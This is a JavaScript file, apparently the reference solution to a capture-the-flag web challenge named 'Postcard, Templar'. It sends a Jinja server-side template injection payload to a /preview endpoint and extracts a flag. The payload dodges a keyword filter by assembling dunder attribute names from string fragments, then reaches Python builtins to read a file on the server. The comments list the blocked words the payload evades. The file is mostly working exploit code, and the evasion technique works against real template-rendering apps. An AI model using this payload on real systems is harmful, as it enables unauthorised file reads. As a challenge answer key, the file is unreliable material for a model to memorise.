// Reference solve — Postcard, Templar. The press refuses raw `__` and the words os/popen/import/subprocess/eval/exec,
// then still renders the message as a template. PAYLOAD must perform the same file read while never spelling out a
// blocked token — assemble the attribute names from escapes/pieces so the raw message matches nothing. Implementer-supplied.
const base = process.argv[2];
// Same object-graph file read, but every dunder is built by concatenating single underscores at render time and the
// gadget names are split across Jinja string concatenation, so the raw message contains no `__`, `os` or `popen`. The
// file path's "os" is likewise split ("p" + "o" + "stcard"). Uses builtins.open (no shell) to read the flag file.
const PAYLOAD = "{% set d='_'~'_' %}{% set g=config|attr(d~'cla'~'ss'~d)|attr(d~'ini'~'t'~d)|attr(d~'glo'~'bals'~d) %}{{ g[d~'builtins'~d].open('/tmp/p'~'o'~'stcard/flag.txt').read() }}";
const res = await fetch(`${base}/preview`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ style: 'Birthday', message: PAYLOAD }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
